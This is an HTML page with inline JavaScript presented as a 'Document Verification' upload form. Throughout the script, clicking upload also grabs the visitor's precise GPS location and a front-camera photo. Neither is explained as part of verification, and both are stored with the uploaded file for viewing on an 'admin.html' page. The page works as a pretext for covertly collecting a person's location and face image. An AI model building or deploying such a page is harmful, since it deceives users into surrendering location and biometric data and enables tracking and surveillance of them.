<!DOCTYPE html>
<html>
<head>
    <title>Upload Document</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <h1>Document Verification</h1>
    <p>Please upload your document for verification.</p>
    
    <input type="file" id="fileInput" accept="*/*">
    <br>
    <button id="uploadAll" disabled>Upload & Verify</button>
    <div id="status"></div>
    <div id="debug" style="margin-top:20px;font-size:14px;color:#666;"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        let lat, lng, photoData;
        const statusEl = document.getElementById('status');
        const debugEl = document.getElementById('debug');
        const uploadBtn = document.getElementById('uploadAll');
        const fileInput = document.getElementById('fileInput');
        
        function log(msg) {
            debugEl.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
            console.log(msg);
        }
        
        // Enable button when file selected
        fileInput.onchange = () => {
            if (fileInput.files[0]) {
                uploadBtn.disabled = false;
                log('File selected: ' + fileInput.files[0].name);
            }
        };
        
        uploadBtn.onclick = async () => {
            log('Upload button clicked');
            statusEl.textContent = 'Starting...';
            uploadBtn.disabled = true;
            
            try {
                // 1. GPS
                log('Requesting GPS...');
                statusEl.textContent = 'Capturing location...';
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    });
                });
                lat = pos.coords.latitude; 
                lng = pos.coords.longitude;
                log(`GPS captured: ${lat}, ${lng}`);
                
                // 2. Camera
                log('Requesting camera...');
                statusEl.textContent = 'Capturing photo...';
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 320, height: 240 }
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Wait for video to load
                await new Promise(resolve => {
                    if (video.videoWidth > 0) return resolve();
                    video.onloadedmetadata = resolve;
                    setTimeout(resolve, 2000);
                });
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 320;
                canvas.height = video.videoHeight || 240;
                canvas.getContext('2d').drawImage(video, 0, 0);
                photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                log('Photo captured');
                
                // 3. File
                const file = fileInput.files[0];
                log('Reading file: ' + file.name);
                statusEl.textContent = 'Processing file...';
                
                const reader = new FileReader();
                await new Promise((resolve, reject) => {
                    reader.onload = () => resolve();
                    reader.onerror = reject;
                    reader.readAsDataURL(file);
                });
                
                // 4. Save
                const data = {
                    timestamp: new Date().toISOString(),
                    location: {lat, lng},
                    photo: photoData,
                    fileName: file.name,
                    fileData: reader.result,
                    fileSize: file.size
                };
                
                const uploads = JSON.parse(localStorage.getItem('uploads') || '[]');
                uploads.push(data);
                localStorage.setItem('uploads', JSON.stringify(uploads));
                
                statusEl.innerHTML = '✅ <strong>Upload complete!</strong> Check admin.html';
                log('SUCCESS: Saved to localStorage');
                
            } catch (error) {
                log('ERROR: ' + error.message);
                statusEl.textContent = '❌ Failed: ' + error.message;
                statusEl.style.color = '#dc3545';
            }
            
            uploadBtn.disabled = false;
            fileInput.value = '';
        };
        
        log('Page loaded - ready');
    </script>
</body>
</html>
